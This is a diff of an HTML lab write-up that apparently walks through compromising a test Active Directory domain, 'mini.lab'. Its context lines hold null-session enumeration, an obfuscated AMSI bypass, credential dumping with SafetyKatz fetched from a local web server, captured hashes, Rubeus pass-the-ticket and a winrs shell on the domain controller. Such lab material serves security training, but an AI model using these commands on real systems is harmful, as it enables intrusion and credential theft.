@@ -360,13 +360,13 @@ Host script results:
 
 <p><code>sudo vim /etc/hosts</code></p>
 
-<img src="images/image-529.png" alt="image.png">
+<img src="images/image-002.png" alt="image.png">
 
 <p>Now we edit the /etc/resolv.conf file and add the follow configuration.</p>
 
 <p><code>sudo vim etc/resolv.conf</code></p>
 
-<img src="images/image-497.png" alt="image.png">
+<img src="images/image-003.png" alt="image.png">
 
 <p>Last but not list we need to start our dnsmasq and make it read the /etc/hosts file and we are ready to go.</p>
 <p><code>dnsmasq -H /etc/hosts</code></p>
@@ -377,7 +377,7 @@ Host script results:
 
 <p><code>host ws.mini.lab</code></p>
 
-<img src="images/image-498.png" alt="image.png">
+<img src="images/image-004.png" alt="image.png">
 
 <h2>Setting Up Kerberos</h2>
 
@@ -422,25 +422,25 @@ Host script results:
 
 <p><code>netexec smb 192.168.40.0/24</code></p>
 
-<img src="images/image-499.png" alt="image.png">
+<img src="images/image-005.png" alt="image.png">
 
 <h3>SMB Shares enumeration with smbclient</h3>
 
 <p><code>smbclient -U '' -L \\\\ws.mini.lab -N --option='client min protocol=NT1'</code></p>
 
-<img src="images/image-500.png" alt="image.png">
+<img src="images/image-006.png" alt="image.png">
 
 <h3>SMB Shares enumeration with NetExec</h3>
 
 <p><code>netexec smb ws.mini.lab -u '' -p ''</code></p>
 
-<img src="images/image-501.png" alt="image.png">
+<img src="images/image-007.png" alt="image.png">
 
 <h3>Password Policy Enumeration</h3>
 
 <p>Let’s see if we can enumerate internal Password Policy and we will use NetExec as well.</p>
 
-<img src="images/image-502.png" alt="image.png">
+<img src="images/image-008.png" alt="image.png">
 
 <p>We can see above that password policy for mini.lab domain is minimum 5 and maximum 24 length.</p>
 
@@ -452,7 +452,7 @@ Host script results:
 
 <p> <code>netexec smb dc.mini.lab -u '' -p '' --users</code></p>
 
-<img src="images/image-503.png" alt="image.png">
+<img src="images/image-009.png" alt="image.png">
 
 <p>This Insecure LSA configuration allowed us to retried the list of some users registered in this domain, at least part of it.  We found 2  non default users (Bob & Dave) and it is also possible to see that under Bob’s description we can find Bob’s password. </p>
 
@@ -460,17 +460,17 @@ Host script results:
 
 <p><code>netexec smb ws.mini.lab -u 'bob' -p 'superman'</code></p>
 
-<img src="images/image-504.png" alt="image.png">
+<img src="images/image-010.png" alt="image.png">
 
 <p><code>netexec rdp ws.mini.lab -u 'bob' -p 'superman'</code></p>
 
-<img src="images/image-505.png" alt="image.png">
+<img src="images/image-011.png" alt="image.png">
 
 <p>So I used the same credentials to access <strong><code>ws.mini.lab</code></strong> workstation.</p>
 <p><strong>Username:</strong> Bob</p>
 <p><strong>Password:</strong> superman</p>
 
-<img src="images/image-506.png" alt="image.png">
+<img src="images/image-012.png" alt="image.png">
 
 <p>Well, now we do have access inside mini.lab domain with a valid user. </p>
 <p>Let’s now start enumerating this domain.</p>
@@ -479,7 +479,7 @@ Host script results:
 
 <p><code>whoami /all</code></p>
 
-<img src="images/image-507.png" alt="image.png">
+<img src="images/image-013.png" alt="image.png">
 
 <h1>Enumerating the mini.lab domain</h1>
 
@@ -508,7 +508,7 @@ REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" 
 
 <p>In short: PowerShell starts in a "ghost mode," where it can execute commands without being logged by default security mechanisms.</p>
 
-<img src="images/image-508.png" alt="image.png">
+<img src="images/image-014.png" alt="image.png">
 
 <pre><code class="language-bash">S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )</code></pre>
 
@@ -516,13 +516,13 @@ REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" 
 
 <p><code>$PSVersionTable.PSVersion</code></p>
 
-<img src="images/image-509.png" alt="image.png">
+<img src="images/image-015.png" alt="image.png">
 
 <p>We are in <strong>PowerShell 5.1 (build 19041)</strong> this version <strong>has AMSI and ScriptBlock Logging enabled by default</strong>, so typical AMSI bypasses often get flagged.</p>
 
 <p><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=8080 connectaddress=192.168.40.1</code></p>
 
-<img src="images/image-510.png" alt="image.png">
+<img src="images/image-016.png" alt="image.png">
 
 <p>I tried to import and run PowerView.ps1 into the memory for enumeration, but I was getting caught by the Defender, so I decided to use ADModule.</p>
 
@@ -532,11 +532,11 @@ REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" 
 
 <p><code>Import-Module .\[Microsoft.ActiveDirectory.Management.dll](http://127.0.0.1:8080/Microsoft.ActiveDirectory.Management.dll)</code> </p>
 
-<img src="images/image-511.png" alt="image.png">
+<img src="images/image-017.png" alt="image.png">
 
 <p><code>Get-ADUser -Filter * | Select -ExpandProperty 'Name'</code></p>
 
-<img src="images/image-512.png" alt="image.png">
+<img src="images/image-018.png" alt="image.png">
 
 <p><strong>Why We Saw Only 2 Users with Insecure LSA Configuration Allowing Null Session Enumeration, but More with Authenticated Access</strong></p>
 
@@ -548,31 +548,31 @@ REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" 
 
 <p><code>Get-ADUser -Filter * | Select -ExpandProperty 'SamAccountName'</code></p>
 
-<img src="images/image-513.png" alt="image.png">
+<img src="images/image-019.png" alt="image.png">
 
 <p>Enumerating Groups with ADModule</p>
 
 <p><code>Get-ADGroup -Filter * | Select -ExpandProperty 'SamAccountName'</code></p>
 
-<img src="images/image-514.png" alt="image.png">
+<img src="images/image-020.png" alt="image.png">
 
 <p><code>Get-ADGroup -Identity 'Administrators'</code></p>
 
 <p><code>Get-ADGroup -Identity 'Administrators' -Properties *</code></p>
 
-<img src="images/image-515.png" alt="image.png">
+<img src="images/image-021.png" alt="image.png">
 
 <p><code>Get-ADGroup -Identity 'wsrdp'</code></p>
 
 <p><code>Get-ADGroup -Identity 'wsrdp' -Properties *</code></p>
 
-<img src="images/image-516.png" alt="image.png">
+<img src="images/image-022.png" alt="image.png">
 
 <p><code>Get-ADGroup -Identity 'wsadmin'</code></p>
 
 <p><code>Get-ADGroup -Identity 'wsadmin'-Properties *</code></p>
 
-<img src="images/image-517.png" alt="image.png">
+<img src="images/image-023.png" alt="image.png">
 
 <h3>Special Group</h3>
 
@@ -602,19 +602,19 @@ REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" 
 
 <p><code>Get-ADGroupMember -Identity 'Enterprise Admins' -Server 'mini.lab'</code></p>
 
-<img src="images/image-518.png" alt="image.png">
+<img src="images/image-024.png" alt="image.png">
 
 <p>From our enumeration, It seems like, Administrator is the only member of this Special Group.</p>
 
 <p><code>Get-ADOrganizationalUnit -Filter *</code></p>
 
-<img src="images/image-519.png" alt="image.png">
+<img src="images/image-025.png" alt="image.png">
 
 <p>Now that we were able to find all the OU inside our domain, we can see or list all the computers that belong to any specific student of our choice.</p>
 
 <p><code>Get-ADOrganizationalUnit -Identity 'OU=Domain Controllers,DC=mini,DC=lab' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code></p>
 
-<img src="images/image-520.png" alt="image.png">
+<img src="images/image-026.png" alt="image.png">
 
 <h2>Enumerating Local Admin Access with PowerView</h2>
 
@@ -626,7 +626,7 @@ REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" 
 
 <p><code>Find-LocalAdminAccess -Verbose</code></p>
 
-<img src="images/image-521.png" alt="image.png">
+<img src="images/image-027.png" alt="image.png">
 
 <p>Our current user only have Local Admin Access inside ws.mini.lab, which is the current host we have compromised so far.</p>
 
@@ -634,11 +634,11 @@ REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" 
 
 <p><code>(Get-Acl 'AD:\CN=wsadmin,CN=Users,DC=mini,DC=lab').Access | Select-Object IdentityReference, ActiveDirectoryRights, IsInherited, InheritanceType, ObjectType</code></p>
 
-<img src="images/image-522.png" alt="image.png">
+<img src="images/image-028.png" alt="image.png">
 
 <p><code>(Get-Acl 'AD:\CN=wsadmin,CN=Users,DC=mini,DC=lab').Access | Where-Object { $_.IdentityReference -match 'BUILTIN\\Administrators' } | Select IdentityReference, ActiveDirectoryRights, ObjectType</code></p>
 
-<img src="images/image-523.png" alt="image.png">
+<img src="images/image-029.png" alt="image.png">
 
 <p>After some enumeration I decided to dump the credentials. </p>
 
@@ -648,7 +648,7 @@ REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" 
 
 <p><code>C:\Loader.exe -Path [http://127.0.0.1:8080/SafetyKatz.exe](http://127.0.0.1:8080/SafetyKatz.exe) -args 'sekurlsa::logonpasswords' 'exit'</code></p>
 
-<img src="images/image-524.png" alt="image.png">
+<img src="images/image-030.png" alt="image.png">
 
 <pre><code class="language-bash">Authentication Id : 0 ; 8375533 (00000000:007fcced)
 Session           : NetworkCleartext from 0
@@ -683,7 +683,7 @@ SID               : S-1-5-21-3512894206-2399940235-2846696113-1109
 
 <p><code>C:\Loader.exe -Path [http://127.0.0.1:8080/Rubeus.exe](http://127.0.0.1:8080/Rubeus.exe) -args asktgt /user:carol /rc4:c22b315c040ae6e0efee3518d830362b /opsec /force /domain:mini.lab /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p>
 
-<img src="images/image-525.png" alt="image.png">
+<img src="images/image-031.png" alt="image.png">
 
 <pre><code class="language-bash">S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )</code></pre>
 
@@ -693,15 +693,15 @@ SID               : S-1-5-21-3512894206-2399940235-2846696113-1109
 
 <p><code>Find-LocalAdminAccess -Verbose</code></p>
 
-<img src="images/image-526.png" alt="image.png">
+<img src="images/image-032.png" alt="image.png">
 
 <p><code>Invoke-WebRequest [http://127.0.0.1:8080/fibers-loader.exe](http://127.0.0.1:8080/fibers-loader.exe) -OutFile Loader.exe -UseBasicParsing</code></p>
 
 <p><code>winrs -r:dc.mini.local cmd</code></p>
 
-<img src="images/image-527.png" alt="image.png">
+<img src="images/image-033.png" alt="image.png">
 
-<img src="images/image-528.png" alt="image.png">
+<img src="images/image-034.png" alt="image.png">
         </section>
       </article>
     </div>
